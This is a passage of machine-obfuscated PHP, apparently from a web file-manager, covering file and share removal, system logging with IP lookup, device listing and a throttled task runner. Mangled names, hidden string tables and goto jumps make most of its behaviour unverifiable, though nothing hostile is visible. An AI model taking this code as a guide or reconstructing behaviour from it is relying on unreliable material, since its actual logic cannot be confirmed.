array($‘¤°ë¡—[484] => $ÉìÆúòò, $‘¤°ë¡—[2192] => $‘¤°ë¡—[629], $‘¤°ë¡—[32] => $Ü˜¸¾·[$‘¤°ë¡—[32]], $‘¤°ë¡—[1270] => $Ü˜¸¾·); Hook::trigger($‘¤°ë¡—[1766], array($‘¤°ë¡—[1270] => $‘ÅæÊ·›, $‘¤°ë¡—[1280] => !0)); show_json($åŒ¿©Æ, !1, 100111); } if ($§£Ü¬¹È == $‘¤°ë¡—[629]) { return !0; } if ($ÆÊŠé¦Á || $ÓñÒàİ¼) { $—ş°§É¨ = array_merge($ÆÊŠé¦Á, $ÓñÒàİ¼); $—ş°§É¨ = array_filter(array_unique($—ş°§É¨)); $this->removeByFileID($—ş°§É¨); } if ($æ¼øÒ¸µ) { $æ¼øÒ¸µ = array_filter(array_unique($æ¼øÒ¸µ)); foreach ($æ¼øÒ¸µ as $ÊÔä·É…) { $Õ·„ç“ß = IO::has($ÊÔä·É…, !0); if (!$Õ·„ç“ß[$‘¤°ë¡—[239]] && !$Õ·„ç“ß[$‘¤°ë¡—[240]]) { IO::remove($ÊÔä·É…); } } } return $this->remove($ÉìÆúòò); } private function removeByFileID($ë ¦‰¢ = array()) { $µ—¸¬’ê =& $_SERVER[£ğ°ÖØø]; if (empty($ë ¦‰¢)) { return; } $í”ì€Ì = array($µ—¸¬’ê[550] => array($µ—¸¬’ê[7], $ë ¦‰¢)); $Œ îû¼Ó = Model($µ—¸¬’ê[1401])->where($í”ì€Ì)->field($µ—¸¬’ê[193])->select(); if (!$Œ îû¼Ó) { return Model($µ—¸¬’ê[553])->remove($ë ¦‰¢); } $Œ îû¼Ó = array_to_keyvalue($Œ îû¼Ó, $µ—¸¬’ê[12], $µ—¸¬’ê[193]); foreach ($Œ îû¼Ó as $ Íù¡âï) { Model($µ—¸¬’ê[888])->removeNow($ Íù¡âï, !1); } } private function removeShareItems($¶Ùø——¾) { $ìß®÷Œì =& $_SERVER[£ğ°ÖØø]; $’äóüœ = "\x7b\x69\157\72{$¶Ùø——¾}\175\x2f"; $¦Ì¿”ãœ = array($ìß®÷Œì[193] => 0, $ìß®÷Œì[1240] => array($ìß®÷Œì[468], "{$’äóüœ}\45")); $´ìËÜğÏ = Model($ìß®÷Œì[1933])->where($¦Ì¿”ãœ)->field($ìß®÷Œì[674])->select(); if (empty($´ìËÜğÏ)) { return; } $Şü¨ø–¥ = array_to_keyvalue($´ìËÜğÏ, $ìß®÷Œì[12], $ìß®÷Œì[674]); Model($ìß®÷Œì[673])->remove($Şü¨ø–¥); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\114\x69\x67\x68\x74\x41\x70\x70"; public $modelType = "\x53\x79\163\164\145\x6d\x4f\x70\164\151\157\x6e"; public $field = array("\156\x61\155\145", "\x67\x72\157\165\160", "\144\145\163\x63", "\x63\157\x6e\x74\x65\156\164"); public function listData($ä±†ÒÖ¬ = false, $Ê»²©ÉÖ = "\155\x6f\x64\x69\146\171\124\x69\155\x65", $ºçåƒ¶õ = true) { return parent::listData($ä±†ÒÖ¬, $Ê»²©ÉÖ, $ºçåƒ¶õ); } public function remove($Æ€Âİ¤) { $Ïêş²Í = $this->findByName($Æ€Âİ¤); if (!$Ïêş²Í) { return !1; } return parent::remove($Ïêş²Í[$_SERVER[£ğ°ÖØø][484]]); } public function add($ú‰úäÒë) { if ($this->findByName($ú‰úäÒë[$_SERVER[£ğ°ÖØø][32]])) { return !1; } return parent::insert($ú‰úäÒë); } public function update($»Ä®ÅÜ¦, $¨Ôş÷Ê) { $¿Å¼ƒ‘ =& $_SERVER[£ğ°ÖØø]; $¤ôÃìÈ = $this->findByName($»Ä®ÅÜ¦); $Ÿ§‰Ñã = $this->findByName($¨Ôş÷Ê[$¿Å¼ƒ‘[32]]); if (!$¤ôÃìÈ || $Ÿ§‰Ñã && $Ÿ§‰Ñã[$¿Å¼ƒ‘[484]] != $¤ôÃìÈ[$¿Å¼ƒ‘[484]]) { return !1; } return parent::update($¤ôÃìÈ[$¿Å¼ƒ‘[484]], $¨Ôş÷Ê); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\x69\x6d\x65", "\x74\151\x6d\145", "\151\156\x73\x65\162\x74", "\146\x75\156\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ª¶¹íÛÈ =& $_SERVER[£ğ°ÖØø]; return array($ª¶¹íÛÈ[2314] => LNG($ª¶¹íÛÈ[2315]), $ª¶¹íÛÈ[2316] => LNG($ª¶¹íÛÈ[2317]), $ª¶¹íÛÈ[1896] => LNG($ª¶¹íÛÈ[2318]), $ª¶¹íÛÈ[2319] => LNG($ª¶¹íÛÈ[2320]), $ª¶¹íÛÈ[2321] => LNG($ª¶¹íÛÈ[2322]), $ª¶¹íÛÈ[2323] => LNG($ª¶¹íÛÈ[2324]), $ª¶¹íÛÈ[2325] => LNG($ª¶¹íÛÈ[2326]), $ª¶¹íÛÈ[1926] => LNG($ª¶¹íÛÈ[2326]), $ª¶¹íÛÈ[1927] => LNG($ª¶¹íÛÈ[2327]), $ª¶¹íÛÈ[2328] => LNG($ª¶¹íÛÈ[2329]), $ª¶¹íÛÈ[2330] => LNG($ª¶¹íÛÈ[2331]), $ª¶¹íÛÈ[2332] => LNG($ª¶¹íÛÈ[2333]), $ª¶¹íÛÈ[2334] => LNG($ª¶¹íÛÈ[2335]), $ª¶¹íÛÈ[1924] => LNG($ª¶¹íÛÈ[2336]), $ª¶¹íÛÈ[2337] => LNG($ª¶¹íÛÈ[2338]), $ª¶¹íÛÈ[1931] => LNG($ª¶¹íÛÈ[2339]), $ª¶¹íÛÈ[2340] => LNG($ª¶¹íÛÈ[2341]), $ª¶¹íÛÈ[2342] => LNG($ª¶¹íÛÈ[2343]), $ª¶¹íÛÈ[2344] => LNG($ª¶¹íÛÈ[2345]), $ª¶¹íÛÈ[2346] => LNG($ª¶¹íÛÈ[2347]), $ª¶¹íÛÈ[1934] => LNG($ª¶¹íÛÈ[2348]), $ª¶¹íÛÈ[1935] => LNG($ª¶¹íÛÈ[2349]), $ª¶¹íÛÈ[2350] => LNG($ª¶¹íÛÈ[2351]), $ª¶¹íÛÈ[2352] => LNG($ª¶¹íÛÈ[2353]), $ª¶¹íÛÈ[2354] => LNG($ª¶¹íÛÈ[2355]), $ª¶¹íÛÈ[1929] => LNG($ª¶¹íÛÈ[2356]), $ª¶¹íÛÈ[2357] => LNG($ª¶¹íÛÈ[2358]), $ª¶¹íÛÈ[1928] => LNG($ª¶¹íÛÈ[2359]), $ª¶¹íÛÈ[2360] => LNG($ª¶¹íÛÈ[2361]), $ª¶¹íÛÈ[2362] => LNG($ª¶¹íÛÈ[2363]), $ª¶¹íÛÈ[2364] => LNG($ª¶¹íÛÈ[2363]), $ª¶¹íÛÈ[2365] => LNG($ª¶¹íÛÈ[2366]), $ª¶¹íÛÈ[2367] => LNG($ª¶¹íÛÈ[2367]), $ª¶¹íÛÈ[2368] => LNG($ª¶¹íÛÈ[1900]), $ª¶¹íÛÈ[2369] => LNG($ª¶¹íÛÈ[2370]), $ª¶¹íÛÈ[2371] => LNG($ª¶¹íÛÈ[2372]), $ª¶¹íÛÈ[2373] => LNG($ª¶¹íÛÈ[2374]), $ª¶¹íÛÈ[2375] => LNG($ª¶¹íÛÈ[2376]), $ª¶¹íÛÈ[2377] => LNG($ª¶¹íÛÈ[2378]), $ª¶¹íÛÈ[2379] => LNG($ª¶¹íÛÈ[2379]), $ª¶¹íÛÈ[2380] => LNG($ª¶¹íÛÈ[2381]), $ª¶¹íÛÈ[2382] => LNG($ª¶¹íÛÈ[2383]), $ª¶¹íÛÈ[2384] => LNG($ª¶¹íÛÈ[2385]), $ª¶¹íÛÈ[2386] => LNG($ª¶¹íÛÈ[2387]), $ª¶¹íÛÈ[2388] => LNG($ª¶¹íÛÈ[2389]), $ª¶¹íÛÈ[2390] => LNG($ª¶¹íÛÈ[2391]), $ª¶¹íÛÈ[212] => LNG($ª¶¹íÛÈ[212]), $ª¶¹íÛÈ[213] => LNG($ª¶¹íÛÈ[2392]), $ª¶¹íÛÈ[2393] => LNG($ª¶¹íÛÈ[2393])); } private function typeFile() { $ÜŒÑÙ¥‹ =& $_SERVER[£ğ°ÖØø]; $‹Êõ¿¿£ = array($ÜŒÑÙ¥‹[1931] => array($ÜŒÑÙ¥‹[1932]), $ÜŒÑÙ¥‹[2332] => array($ÜŒÑÙ¥‹[2394]), $ÜŒÑÙ¥‹[2334] => array($ÜŒÑÙ¥‹[2395]), $ÜŒÑÙ¥‹[1924] => array($ÜŒÑÙ¥‹[1925], $ÜŒÑÙ¥‹[2396]), $ÜŒÑÙ¥‹[2342] => array(), $ÜŒÑÙ¥‹[2344] => array(), $ÜŒÑÙ¥‹[2346] => array(), $ÜŒÑÙ¥‹[1934] => array($ÜŒÑÙ¥‹[1936]), $ÜŒÑÙ¥‹[1935] => array($ÜŒÑÙ¥‹[1936]), $ÜŒÑÙ¥‹[2350] => array($ÜŒÑÙ¥‹[2397]), $ÜŒÑÙ¥‹[2352] => array($ÜŒÑÙ¥‹[2397]), $ÜŒÑÙ¥‹[2354] => array($ÜŒÑÙ¥‹[2398]), $ÜŒÑÙ¥‹[2340] => array($ÜŒÑÙ¥‹[2399]), $ÜŒÑÙ¥‹[1929] => array($ÜŒÑÙ¥‹[2400]), $ÜŒÑÙ¥‹[2357] => array($ÜŒÑÙ¥‹[2401]), $ÜŒÑÙ¥‹[1928] => array($ÜŒÑÙ¥‹[1930])); return $‹Êõ¿¿£; } private function typeAll() { $ÒÉ—ßß½ =& $_SERVER[£ğ°ÖØø]; $ÅŒ™í¹­ = $this->typeList; $¥óÌŞüï = array_filter($this->typeFile()); foreach ($¥óÌŞüï as $û‚»ğù§ => $ó­—ëì’) { $ÅŒ™í¹­[$ó­—ëì’[0]] = $ÅŒ™í¹­[$û‚»ğù§]; } $ÅŒ™í¹­[$ÒÉ—ßß½[1936]] = LNG($ÒÉ—ßß½[2402]); $ÅŒ™í¹­[$ÒÉ—ßß½[2397]] = LNG($ÒÉ—ßß½[2403]); return $ÅŒ™í¹­; } public function addLog($œ¤öÍ‹µ, $äÒíé…œ = array()) { $¡ıÈ¶ =& $_SERVER[£ğ°ÖØø]; if (!isset($this->typeList[$œ¤öÍ‹µ])) { return; } $õÅ×µñû = Session::get($¡ıÈ¶[2095]); if (!$õÅ×µñû) { $õÅ×µñû = _get($äÒíé…œ, $¡ıÈ¶[1755], 0); } if ($œ¤öÍ‹µ == $¡ıÈ¶[2369] && is_array($äÒíé…œ[$¡ıÈ¶[2404]]) && !$äÒíé…œ[$¡ıÈ¶[2404]]) { return; } $Ó©“ŠßÄ = get_client_ip(); if (!$äÒíé…œ || strlen(json_encode($äÒíé…œ)) >= 1024 * 64) { if ($äÒíé…œ && is_array($äÒíé…œ)) { $äÒíé…œ = array_intersect_key($äÒíé…œ, array_flip($¡ıÈ¶[484], $¡ıÈ¶[32])); $äÒíé…œ[$¡ıÈ¶[2405]] = $Ó©“ŠßÄ; } else { $äÒíé…œ = array($¡ıÈ¶[2405] => $Ó©“ŠßÄ); } } else { if (is_array($äÒíé…œ)) { $äÒíé…œ[$¡ıÈ¶[2405]] = $Ó©“ŠßÄ; } else { $äÒíé…œ = array($¡ıÈ¶[1270] => $äÒíé…œ, $¡ıÈ¶[2405] => $Ó©“ŠßÄ); } } $äÒíé…œ = array($¡ıÈ¶[1745] => Session::sign(), $¡ıÈ¶[1746] => intval($õÅ×µñû), $¡ıÈ¶[33] => $œ¤öÍ‹µ, $¡ıÈ¶[1748] => json_encode($äÒíé…œ)); parent::add($äÒíé…œ); } public function remove($Œ¾ï¡ Ú) { $this->where(array($_SERVER[£ğ°ÖØø][502] => $Œ¾ï¡ Ú))->delete(); } private function _makeOrder($ñÅ»š¿Ç = '') { $¶“Š¹¤— =& $_SERVER[£ğ°ÖØø]; $‰¼İÖ” = $¶“Š¹¤—[231]; $ ¦ø¾ÑÆ = array($¶“Š¹¤—[532] => $¶“Š¹¤—[533], $¶“Š¹¤—[534] => $¶“Š¹¤—[535]); $‹Ş’äìô = Input::get($¶“Š¹¤—[540], $¶“Š¹¤—[7], $¶“Š¹¤—[2131], array($¶“Š¹¤—[2049], $¶“Š¹¤—[534])); $‹Ş’äìô = $ ¦ø¾ÑÆ[$‹Ş’äìô]; $ñÅ»š¿Ç = $ñÅ»š¿Ç . "{$‰¼İÖ”}\40{$‹Ş’äìô}"; return $this->order($ñÅ»š¿Ç); } public function get($¡ªó²„à = '') { $‘©©›Ûû =& $_SERVER[£ğ°ÖØø]; if (!$¡ªó²„à) { show_json(array()); } $ªöÓ”‡ü = array(); if ($¡ªó²„à[$‘©©›Ûû[1755]]) { $ªöÓ”‡ü[$‘©©›Ûû[1755]] = $¡ªó²„à[$‘©©›Ûû[1755]]; } if (isset($¡ªó²„à[$‘©©›Ûû[824]])) { $ÃÎ› ïÛ = $¡ªó²„à[$‘©©›Ûû[824]]; $ƒı¿âíÖ = isset($¡ªó²„à[$‘©©›Ûû[825]]) ? $¡ªó²„à[$‘©©›Ûû[825]] : time(); $ªöÓ”‡ü[$‘©©›Ûû[231]] = array($‘©©›Ûû[409], array($ÃÎ› ïÛ, $ƒı¿âíÖ)); } if ($¡ªó²„à[$‘©©›Ûû[33]]) { $ûÕ¶¯†™ = explode($‘©©›Ûû[50], $¡ªó²„à[$‘©©›Ûû[33]]); $™á—÷¯ = $this->typeFile(); $‰«¤›Ó = array(); foreach ($ûÕ¶¯†™ as $÷ªËÁ¢à) { $‰«¤›Ó[] = $÷ªËÁ¢à; if (isset($™á—÷¯[$÷ªËÁ¢à])) { $‰«¤›Ó = array_merge($‰«¤›Ó, $™á—÷¯[$÷ªËÁ¢à]); } } $‰«¤›Ó = array_unique($‰«¤›Ó); if ($‰«¤›Ó) { $ªöÓ”‡ü[$‘©©›Ûû[33]] = array($‘©©›Ûû[7], $‰«¤›Ó); } } else { $ªöÓ”‡ü[$‘©©›Ûû[33]] = array($‘©©›Ûû[2406], $‘©©›Ûû[2407]); } if (!empty($¡ªó²„à[$‘©©›Ûû[2405]])) { $ªöÓ”‡ü[$‘©©›Ûû[535]] = array($‘©©›Ûû[468], "\45{$¡ªó²„à[$‘©©›Ûû[2405]]}\45"); } $ŸÇ’é­Œ = $this->_makeOrder()->where($ªöÓ”‡ü)->selectPage(); if (empty($ŸÇ’é­Œ[$‘©©›Ûû[454]])) { show_json(array(), !0, $ŸÇ’é­Œ[$‘©©›Ûû[451]]); } $ŸÇ’é­Œ[$‘©©›Ûû[454]] = $this->logList($ŸÇ’é­Œ[$‘©©›Ûû[454]]); return $ŸÇ’é­Œ; } private function ipAddress(&$Ü‚×ÃÊø) { $Èè›€¹á =& $_SERVER[£ğ°ÖØø]; if (!empty($Ü‚×ÃÊø[$Èè›€¹á[2405]])) { $Ş²â±šµ = IpLocation::get($Ü‚×ÃÊø[$Èè›€¹á[2405]]); } else { $Ş²â±šµ = LNG($Èè›€¹á[2408]); } $Ü‚×ÃÊø[$Èè›€¹á[2409]] = $Ş²â±šµ; } private function descZipDownload($é¡ùŸÆİ, &$µ¦§€›º) { $ŸµŸŸ =& $_SERVER[£ğ°ÖØø]; if (!isset($é¡ùŸÆİ[$ŸµŸŸ[2410]])) { return; } $ßˆ²ß¢œ = json_decode($é¡ùŸÆİ[$ŸµŸŸ[2410]], !0); foreach ($ßˆ²ß¢œ as $ûÀ–ÂÜÕ) { try { $ÍÔ“¹ò¢ = IO::infoFullSimple($ûÀ–ÂÜÕ[$ŸµŸŸ[87]]); } catch (Exception $‰éÌŒÌÈ) { continue; } $é¡ùŸÆİ[$ŸµŸŸ[87]] = $ûÀ–ÂÜÕ[$ŸµŸŸ[87]]; $µ¦§€›º[] = $é¡ùŸÆİ[$ŸµŸŸ[193]] = $ÍÔ“¹ò¢[$ŸµŸŸ[193]]; $µ¦§€›º[] = $é¡ùŸÆİ[$ŸµŸŸ[2187]] = $ÍÔ“¹ò¢[$ŸµŸŸ[192]]; break; } return $é¡ùŸÆİ; } private function getSourceList(&$îöÂö´Î) { $¢Ûè…ÇÍ =& $_SERVER[£ğ°ÖØø]; $“•û˜Ôı = array(); foreach ($îöÂö´Î as $şÁšì¨§ => $É—½ªÛ) { $İ”©’ï« = json_decode($É—½ªÛ[$¢Ûè…ÇÍ[535]], !0); if ($É—½ªÛ[$¢Ûè…ÇÍ[33]] == $¢Ûè…ÇÍ[1927]) { $İ”©’ï« = $this->descZipDownload($İ”©’ï«, $“•û˜Ôı); $îöÂö´Î[$şÁšì¨§][$¢Ûè…ÇÍ[535]] = json_encode($İ”©’ï«); continue; } if (strpos($É—½ªÛ[$¢Ûè…ÇÍ[33]], $¢Ûè…ÇÍ[2189]) !== 0) { if (!isset($İ”©’ï«[$¢Ûè…ÇÍ[87]]) || strpos($É—½ªÛ[$¢Ûè…ÇÍ[33]], $¢Ûè…ÇÍ[2411]) !== 0) { continue; } try { $ø˜•Ø° = IO::infoFullSimple($İ”©’ï«[$¢Ûè…ÇÍ[87]]); } catch (Exception $€ñ³Æå) { continue; } $“•û˜Ôı[] = $İ”©’ï«[$¢Ûè…ÇÍ[193]] = $ø˜•Ø°[$¢Ûè…ÇÍ[193]]; $“•û˜Ôı[] = $İ”©’ï«[$¢Ûè…ÇÍ[2187]] = $ø˜•Ø°[$¢Ûè…ÇÍ[192]]; $îöÂö´Î[$şÁšì¨§][$¢Ûè…ÇÍ[535]] = json_encode($İ”©’ï«); continue; } $“•û˜Ôı[] = $İ”©’ï«[$¢Ûè…ÇÍ[193]]; $“•û˜Ôı[] = $İ”©’ï«[$¢Ûè…ÇÍ[2187]]; if ($İ”©’ï«[$¢Ûè…ÇÍ[33]] == $¢Ûè…ÇÍ[629]) { $“•û˜Ôı[] = $İ”©’ï«[$¢Ûè…ÇÍ[535]][$¢Ûè…ÇÍ[1224]]; $“•û˜Ôı[] = $İ”©’ï«[$¢Ûè…ÇÍ[535]][$¢Ûè…ÇÍ[1225]]; } if ($İ”©’ï«[$¢Ûè…ÇÍ[33]] == $¢Ûè…ÇÍ[2198]) { $“•û˜Ôı[] = $İ”©’ï«[$¢Ûè…ÇÍ[535]][$¢Ûè…ÇÍ[193]]; } } if (!$“•û˜Ôı) { return array(); } return Model($¢Ûè…ÇÍ[888])->sourceListInfo($“•û˜Ôı, !0); } private function logList($‰ø³áØì) { $­ÃÏô¨© =& $_SERVER[£ğ°ÖØø]; $üÆ‰Ä½ = array_to_keyvalue($‰ø³áØì, $­ÃÏô¨©[12], $­ÃÏô¨©[1755]); $³¶…Ñïë = Model($­ÃÏô¨©[607])->userListInfo(array_unique($üÆ‰Ä½)); $Í³ø¿²Æ = $this->getSourceList($‰ø³áØì); $ìœòïÛ = $this->typeAll(); $º§ú²ñ˜ = array(); $Ö„“–‹ı = array(); foreach ($‰ø³áØì as $ÉÄ¢»® => $ãÅ²œ¬î) { $ÏšœùŸ = $ãÅ²œ¬î[$­ÃÏô¨©[33]]; $é¥Ë• = isset($³¶…Ñïë[$ãÅ²œ¬î[$­ÃÏô¨©[1755]]]) ? $³¶…Ñïë[$ãÅ²œ¬î[$­ÃÏô¨©[1755]]] : !1; $–¦ÚöŠ = strpos($ÏšœùŸ, $­ÃÏô¨©[2412]) === 0 ? LNG($­ÃÏô¨©[2413]) : LNG($­ÃÏô¨©[2408]); $ãÅ²œ¬î[$­ÃÏô¨©[32]] = isset($é¥Ë•[$­ÃÏô¨©[32]]) ? $é¥Ë•[$­ÃÏô¨©[32]] : LNG($­ÃÏô¨©[2408]); $ãÅ²œ¬î[$­ÃÏô¨©[2242]] = isset($é¥Ë•[$­ÃÏô¨©[2242]]) ? $é¥Ë•[$­ÃÏô¨©[2242]] : $­ÃÏô¨©[12]; $ãÅ²œ¬î[$­ÃÏô¨©[1642]] = isset($ìœòïÛ[$ÏšœùŸ]) ? $ìœòïÛ[$ÏšœùŸ] : $–¦ÚöŠ; $ãÅ²œ¬î[$­ÃÏô¨©[2130]] = $é¥Ë•; $æçùìÏ = json_decode($ãÅ²œ¬î[$­ÃÏô¨©[535]], !0); $ãÅ²œ¬î[$­ÃÏô¨©[2405]] = isset($æçùìÏ[$­ÃÏô¨©[2405]]) ? $æçùìÏ[$­ÃÏô¨©[2405]] : $­ÃÏô¨©[12]; $ãÅ²œ¬î[$­ÃÏô¨©[2409]] = IpLocation::get($ãÅ²œ¬î[$­ÃÏô¨©[2405]]); if (strpos($ÏšœùŸ, $­ÃÏô¨©[2189]) === 0 || isset($æçùìÏ[$­ÃÏô¨©[2187]])) { $æçùìÏ[$­ÃÏô¨©[90]] = $Í³ø¿²Æ[$æçùìÏ[$­ÃÏô¨©[193]]]; $æçùìÏ[$­ÃÏô¨©[2203]] = $Í³ø¿²Æ[$æçùìÏ[$­ÃÏô¨©[2187]]]; if ($æçùìÏ[$­ÃÏô¨©[33]] == $­ÃÏô¨©[629]) { $æçùìÏ[$­ÃÏô¨©[535]][$­ÃÏô¨©[1224]] = $Í³ø¿²Æ[$æçùìÏ[$­ÃÏô¨©[535]][$­ÃÏô¨©[1224]]]; $æçùìÏ[$­ÃÏô¨©[535]][$­ÃÏô¨©[1225]] = $Í³ø¿²Æ[$æçùìÏ[$­ÃÏô¨©[535]][$­ÃÏô¨©[1225]]]; } if ($æçùìÏ[$­ÃÏô¨©[33]] == $­ÃÏô¨©[2198]) { $æçùìÏ[$­ÃÏô¨©[535]][$­ÃÏô¨©[193]] = $Í³ø¿²Æ[$æçùìÏ[$­ÃÏô¨©[535]][$­ÃÏô¨©[193]]]; } if ($æçùìÏ[$­ÃÏô¨©[33]] == $­ÃÏô¨©[1922]) { $æçùìÏ[$­ÃÏô¨©[2203]] = $æçùìÏ[$­ÃÏô¨©[90]]; $æçùìÏ[$­ÃÏô¨©[2187]] = $æçùìÏ[$­ÃÏô¨©[2203]][$­ÃÏô¨©[193]]; $æçùìÏ[$­ÃÏô¨©[90]] = !1; $æçùìÏ[$­ÃÏô¨©[193]] = $­ÃÏô¨©[12]; } $¦ğÇ¬äÍ = array($­ÃÏô¨©[1922], $­ÃÏô¨©[2185]); if (!in_array($æçùìÏ[$­ÃÏô¨©[33]], $¦ğÇ¬äÍ)) { if ($æçùìÏ[$­ÃÏô¨©[90]] && $æçùìÏ[$­ÃÏô¨©[90]][$­ÃÏô¨©[190]] == $­ÃÏô¨©[191]) { $Ö„“–‹ı[] = $ãÅ²œ¬î[$­ÃÏô¨©[484]]; unset($‰ø³áØì[$ÉÄ¢»®]); continue; } if ($æçùìÏ[$­ÃÏô¨©[2203]] && $æçùìÏ[$­ÃÏô¨©[2203]][$­ÃÏô¨©[190]] == $­ÃÏô¨©[191]) { $Ö„“–‹ı[] = $ãÅ²œ¬î[$­ÃÏô¨©[484]]; unset($‰ø³áØì[$ÉÄ¢»®]); continue; } } } $ãÅ²œ¬î[$­ÃÏô¨©[535]] = $æçùìÏ; unset($ãÅ²œ¬î[$­ÃÏô¨©[2414]]); $º§ú²ñ˜[] = $ãÅ²œ¬î; } $this->clearSystemPathLog($Ö„“–‹ı); return $º§ú²ñ˜; } private function clearSystemPathLog($µÔÉƒÃ³) { $Á–¼Ç­ =& $_SERVER[£ğ°ÖØø]; if (count($µÔÉƒÃ³) == 0) { return; } $ó¯ ÁÉ = array($Á–¼Ç­[484] => array($Á–¼Ç­[7], array_unique($µÔÉƒÃ³))); $this->where($ó¯ ÁÉ)->delete(); } public function deviceList($‡à‹®¢, $‰·ÊÌÆ« = 0) { $¯„™·ë =& $_SERVER[£ğ°ÖØø]; $ÓÖôÀı„ = array($¯„™·ë[1755] => $‡à‹®¢, $¯„™·ë[231] => array($¯„™·ë[1075], $‰·ÊÌÆ«), $¯„™·ë[33] => $¯„™·ë[1896]); $ÔÇÄÆ£Ó = array(); $ùÃÍöŠç = $this->field($¯„™·ë[2415])->where($ÓÖôÀı„)->order($¯„™·ë[2201])->limit(50)->select(); foreach ($ùÃÍöŠç as $€¡Ä°ì => $²ã”Ì‹) { if ($€¡Ä°ì > 0 && abs($²ã”Ì‹[$¯„™·ë[231]] - $ùÃÍöŠç[$€¡Ä°ì - 1][$¯„™·ë[231]]) < 5) { continue; } $üóÔ»‰ë = json_decode($²ã”Ì‹[$¯„™·ë[535]], !0); $²ã”Ì‹[$¯„™·ë[2405]] = isset($üóÔ»‰ë[$¯„™·ë[2405]]) ? $üóÔ»‰ë[$¯„™·ë[2405]] : $¯„™·ë[12]; unset($üóÔ»‰ë[$¯„™·ë[2405]]); $éó‚”È = $this->deviceType($üóÔ»‰ë[$¯„™·ë[2190]]); if (isset($ÔÇÄÆ£Ó[$éó‚”È])) { continue; } $²ã”Ì‹[$¯„™·ë[2409]] = IpLocation::get($²ã”Ì‹[$¯„™·ë[2405]]); $²ã”Ì‹[$¯„™·ë[535]] = $üóÔ»‰ë; $ÔÇÄÆ£Ó[$éó‚”È] = $²ã”Ì‹; } return array_values($ÔÇÄÆ£Ó); } public function deviceType($€Ô¬ïü) { return $€Ô¬ïü; } } goto F½°ÜÜ‡†É; A²®­¬¨èù: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($âå¸øò, $è’º¡´§ = 5.0) { if (!$âå¸øò) { return; } $«•Éóå¾ = Cache::get($âå¸øò); if (!$«•Éóå¾ || timeFloat() - floatVal($«•Éóå¾) >= $è’º¡´§) { Cache::set($âå¸øò, timeFloat(), $è’º¡´§ * 10); return !0; } return !1; } public static function timeLimitCall($ÔÙŞªõ‹, $­¬“Ê , $ïÌÉşëŠ, $·îâ³º— = 5.0) { $£¦äõãÎ =& $_SERVER[£ğ°ÖØø]; if (!$ÔÙŞªõ‹ || !$­¬“Ê ) { return; } self::$asyncAdd = !0; $×Õƒ¡û = $£¦äõãÎ[1861]; $âúÛ…ğĞ = Cache::get($×Õƒ¡û, !0); $©±›àïÜ = array($£¦äõãÎ[1862] => timeFloat(), $£¦äõãÎ[1863] => timeFloat(), $£¦äõãÎ[341] => $­¬“Ê , $£¦äõãÎ[1853] => $ïÌÉşëŠ, $£¦äõãÎ[206] => $·îâ³º—); if (is_array($âúÛ…ğĞ[$ÔÙŞªõ‹])) { $©±›àïÜ[$£¦äõãÎ[1863]] = $âúÛ…ğĞ[$ÔÙŞªõ‹][$£¦äõãÎ[1863]]; } if (is_array($âúÛ…ğĞ[$ÔÙŞªõ‹])) { if (timeFloat() - $âúÛ…ğĞ[$ÔÙŞªõ‹][$£¦äõãÎ[1862]] < $©±›àïÜ[$£¦äõãÎ[206]] * 0.3) { return; } $©±›àïÜ[$£¦äõãÎ[1863]] = $âúÛ…ğĞ[$ÔÙŞªõ‹][$£¦äõãÎ[1863]]; } $âúÛ…ğĞ[$ÔÙŞªõ‹] = $©±›àïÜ; Cache::set($×Õƒ¡û, $âúÛ…ğĞ, 60); Cache::removeMemory($×Õƒ¡û); write_log($£¦äõãÎ[1864] . $ÔÙŞªõ‹ . $£¦äõãÎ[74] . $­¬“Ê , $£¦äõãÎ[197]); } public static function timeLimitCallLoop() { $Úè×‘Ü° =& $_SERVER[£ğ°ÖØø]; $½Ñ€å³ = array($Úè×‘Ü°[1865]); $ìÎß”„‚ = in_array(strtolower(ACTION), $½Ñ€å³); if (!$ìÎß”„‚ && !self::$asyncAdd) { return; } $ß†Ç·˜Ø = $Úè×‘Ü°[1861]; $ş½°±« = Cache::get($ß†Ç·˜Ø, !0); if (!$ş½°±« || count($ş½°±«) <= 0) { return; } $‚è­ÜÆ’ = !1; $ë®÷¸”Ö = timeFloat(); $…ÜìÛÆ§ = array(); foreach ($ş½°±« as $ş’Ëïİ¬ => $à…ÊÃ†£) { if ($ë®÷¸”Ö - $à…ÊÃ†£[$Úè×‘Ü°[1863]] > $à…ÊÃ†£[$Úè×‘Ü°[206]]) { $‚è­ÜÆ’ = !0; try { Hook::apply($à…ÊÃ†£[$Úè×‘Ü°[341]], $à…ÊÃ†£[$Úè×‘Ü°[1853]]); write_log($Úè×‘Ü°[1866] . $ş’Ëïİ¬ . $Úè×‘Ü°[74] . $à…ÊÃ†£[$Úè×‘Ü°[341]] . $Úè×‘Ü°[1867] . ACTION, $Úè×‘Ü°[197]); } catch (Exception $¶¼¨ı¨) { } continue; } $…ÜìÛÆ§[$ş’Ëïİ¬] = $à…ÊÃ†£; } if (!$‚è­ÜÆ’) { return; } if (!$…ÜìÛÆ§) { return Cache::remove($ß†Ç·˜Ø); } Cache::set($ß†Ç·˜Ø, $…ÜìÛÆ§, 60); Cache::removeMemory($ß†Ç·˜Ø); } public static function finished($áÕÕ«¿ú, $Šé÷Âå†) { $ÉëËî–Ç =& $_SERVER[£ğ°ÖØø]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÉëËî–Ç[341] => $áÕÕ«¿ú, $ÉëËî–Ç[1853] => $Šé÷Âå†); } private static function finishedRun() { $ì±•©ŞÌ =& $_SERVER[£ğ°ÖØø]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ÏÚ£Áû) { try { Hook::apply($ÏÚ£Áû[$ì±•©ŞÌ[341]], $ÏÚ£Áû[$ì±•©ŞÌ[1853]]); } catch (Exception $º·Ë½éÆ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $âŸ˜İã =& $_SERVER[£ğ°ÖØø]; parent::startAfter(); Hook::bind($âŸ˜İã[1868], array($this, $âŸ˜İã[1869])); Hook::bind($âŸ˜İã[1261], array($this, 